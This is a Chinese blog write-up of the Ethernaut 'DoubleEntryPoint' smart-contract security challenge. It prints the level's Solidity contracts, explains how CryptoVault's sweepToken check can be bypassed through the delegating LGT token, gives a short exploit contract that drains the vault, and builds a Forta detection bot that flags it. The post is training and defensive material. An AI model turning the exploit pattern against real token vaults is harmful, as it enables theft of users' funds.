---
title: 'ethernaut.openzeppelin合约安全闯关-20'
date: 2022-12-23 14:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'


---

<!-- more -->

#### 第二十六关   DoubleEntryPoint 思路与POC

#### 目标: 找出CryptoVault合约的错误,并使detectionBot正确发出警报

##### 先看代码:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}
//由用户实现DetectionBot接口,检测交易
interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}
/*
Forta是一个分散的,基于社区的监视网络,可尽快检测DeFi,NFT,治理,桥梁和其他Web3系统上的威胁和异常。
Forta合约允许任何用户,注册自己的detectionBot
*/
contract Forta is IForta {
//DetectionBot
  mapping(address => IDetectionBot) public usersDetectionBots;
  //bot计数map
  mapping(address => uint256) public botRaisedAlerts;
//获取检测机器人合约实例
  function setDetectionBot(address detectionBotAddress) external override {
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }
 //调用用户自定义检测合约handleTransaction方法
  function notify(address user, bytes calldata msgData) external override {
  //如果没有设置Bot合约即放弃往下执行
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return; 
    } catch {}
  }
  //bot发送通知计数+1
  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
}
//token存放合约:存有100个LGT和100个DET
contract CryptoVault { 
   //读取slot发现此处存储的是玩家地址
    address public sweptTokensRecipient;
    
    //token合约IERC20引用,可以从DoubleEntryPoint合约中获取CryptoVault合约地址,
    //之后调用underlying变量来验证到底是哪个token
    //其实也可以直接读取slot
    IERC20 public underlying; 

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
    //只有还没有设置underlying才能通过判断
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */
    
    function sweepToken(IERC20 token) public {
    //不等于underlying代币即可通过
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}
//LGT代币合约
contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
//对应DET token合约
    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }
//重写transfer方法,使所有调用此代币合约transfer函数的都转到DET代币合约的delegateTransfer函数
    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
        //注意这里多了一个形参,如果是触发了CryptoVault合约的sweepToken方法
        //那么此处的msg.sender就是CryptoVault合约
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}
//DET代币合约
contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        //铸造100DET发送到cryptoVault合约
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // 缓存执行开始前机器人发送警告的次数
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        //如果代码执行到最后机器人发送警告,即回退所有操作
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }
  //只允许LGT token合约发起转账,并且触发forta机器人合约
    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
/*
poc思路:其实需要攻击CryptoVault合约相当简单:
1.在DET代币合约中实际已经提供了CryptoVault合约的地址
2.CryptoVault合约的sweepToken函数只校验代币合约不是DET,否则就将合约中的所有代币转移
3.所以调用CryptoVault合约的sweepToken函数传入LGT代币的IERC引用就会将合约的DET全部转移
sweepToken()->LGT(transfer())->DET(delegateTransfer())注意函数调用过程中的形参变化

问题的关键在于怎么实现Forta机器人合约防御
*/
```

##### EXP:

```solidity
// SPDX-License-Identifier: MIT

import "./Vulnerability/DoubleEntry/DoubleEntryPoint.sol";
import "./Vulnerability/DoubleEntry/CryptoVault.sol";
import "./ERC20/IERC20.sol";

pragma solidity ^0.8.0;

//读取 CryptoVault合约 underlying变量 验证doubleEntry
contract doubleEntryHack {
    DoubleEntryPoint de = DoubleEntryPoint(0x2059a107Ec64587E1Bb8E6CA92Fa39d483633660);
    //1.获取 CryptoVault合约地址
    CryptoVault vault = CryptoVault(de.cryptoVault());
    //2.此处的地址是DET token
    address public DETAddress = address(vault.underlying());
    address public LGTAddress = address(de.delegatedFrom());

    function attack() public {
        vault.sweepToken(IERC20(LGTAddress));
    }
}

```

##### 实现forba机器人:

```solidity
function handleTransaction(address user, bytes calldata msgData) external;
forta.notify(player, msg.data);//传入参数
/*
发现了吗,如果要Bot检查某个地址传入的数据必须解析msg.data.
首先需要了解的是在solidity中msg.data的内存结构
如下:
位置	字节/长度	数据类型	值
0x00	4 	     函数选择器  handleTransaction(address,bytes) 第一次入栈
0x04	32	     用户地址    0x....
0x24	32	 	 偏移       msgData
0x44	32	 	 长度       msgData
0x64	4		 函数选择器 delegateTransfer(address,uint256,address) 第二次入栈

-----------------以上为使用forbaBot固定传入data内存数据分布-------------------------

0x68	32		 to 传参    0x....
0x88	32		 value 传参  uint256
0xA8	32		 origSender传参(此处就是Bot需要校验的参数)
0xC8	28		 根据字节码的32字节参数规则进行零填充
*/
```

##### 实现代码:

```solidity
// SPDX-License-Identifier: MIT
import "./DoubleEntryPoint.sol";
pragma solidity ^0.8.0;


contract AlertBot is IDetectionBot {
    address private cryptoVault;
    DoubleEntryPoint de = DoubleEntryPoint(0x2059a107Ec64587E1Bb8E6CA92Fa39d483633660);

    constructor(address _cryptoVault) public {
        cryptoVault = _cryptoVault;
    }

    function handleTransaction(address user, bytes calldata msgData) external override {
        address origSender;
        //取出calldata中的传入形参
        assembly {
            origSender := calldataload(0xa8)
        }
        //如果发送代币地址等于cryptoVault即发送警告
        if (origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
 //设定Bot到forba合约
    function setBot() public {
        de.forta().setDetectionBot(address(this));
    }
}

```

